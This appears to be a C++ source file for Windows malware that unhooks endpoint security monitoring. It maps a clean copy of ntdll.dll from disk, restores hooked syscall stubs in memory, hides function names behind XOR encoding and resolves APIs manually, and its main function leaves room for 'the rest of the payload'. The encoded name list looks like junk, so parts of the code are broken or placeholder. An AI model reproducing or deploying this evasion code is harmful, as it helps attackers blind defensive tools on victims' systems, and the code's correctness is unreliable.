#include <iostream>
#include <windows.h>
#include <winternl.h>

// Function to dynamically resolve WinAPI calls
FARPROC GetProcAddressR(HMODULE hModule, LPCSTR lpProcName) {
    if (!hModule || !lpProcName) {
        return NULL;
    }

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PDWORD addressOfFunctions = (PDWORD)((BYTE*)hModule + exportDirectory->AddressOfFunctions);
    PDWORD addressOfNames = (PDWORD)((BYTE*)hModule + exportDirectory->AddressOfNames);
    PWORD addressOfNameOrdinals = (PWORD)((BYTE*)hModule + exportDirectory->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exportDirectory->NumberOfNames; i++) {
        if (strcmp(lpProcName, (const char*)hModule + addressOfNames[i]) == 0) {
            return (FARPROC)((BYTE*)hModule + addressOfFunctions[addressOfNameOrdinals[i]]);
        }
    }

    return NULL;
}

// Function to restore syscall stubs
void RestoreSyscalls() {
    char ntdllPath[] = "C:\\Windows\\System32\\ntdll.dll";
    HANDLE hFile = CreateFileA(ntdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return;
    }

    HANDLE hMapping = CreateFileMapping(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hMapping) {
        CloseHandle(hFile);
        return;
    }

    LPVOID pMapped = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!pMapped) {
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return;
    }

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        UnmapViewOfFile(pMapped);
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return;
    }

    // XOR encrypted function names
    char encryptedFuncNames[] = "\x1c\x0f\x0e\x01\x0f\x0b\x01\x0f\x1d\x0f\x06\x01\x0f\x0d\x01\x1c\x0f\x0e\x01\x0f\x0b\x01\x0f\x1d\x0f\x06\x01\x0f\x0d\x01\x1c\x0f\x0e\x01\x0f\x0b\x01\x0f\x1d\x0f\x06\x01\x0f\x0d";
    char key = 'X';
    for (int i = 0; i < sizeof(encryptedFuncNames) - 1; i++) {
        encryptedFuncNames[i] ^= key;
    }

    char* funcName = encryptedFuncNames;
    while (*funcName) {
        FARPROC pFunc = GetProcAddressR(hNtdll, funcName);
        FARPROC pCleanFunc = GetProcAddressR((HMODULE)pMapped, funcName);

        if (pFunc && pCleanFunc) {
            // Compare the first 8 bytes of the syscall stub
            if (memcmp(pFunc, pCleanFunc, 8) != 0) {
                // Overwrite the hook
                DWORD oldProtect;
                VirtualProtect(pFunc, 8, PAGE_EXECUTE_READWRITE, &oldProtect);
                memcpy(pFunc, pCleanFunc, 8);
                VirtualProtect(pFunc, 8, oldProtect, &oldProtect);
            }
        }
        funcName += strlen(funcName) + 1;
    }

    UnmapViewOfFile(pMapped);
    CloseHandle(hMapping);
    CloseHandle(hFile);
}

int main() {
    // Decrypt the list of function names
    // ...

    // Restore the syscall stubs
    RestoreSyscalls();

    // ... rest of the payload
    return 0;
}
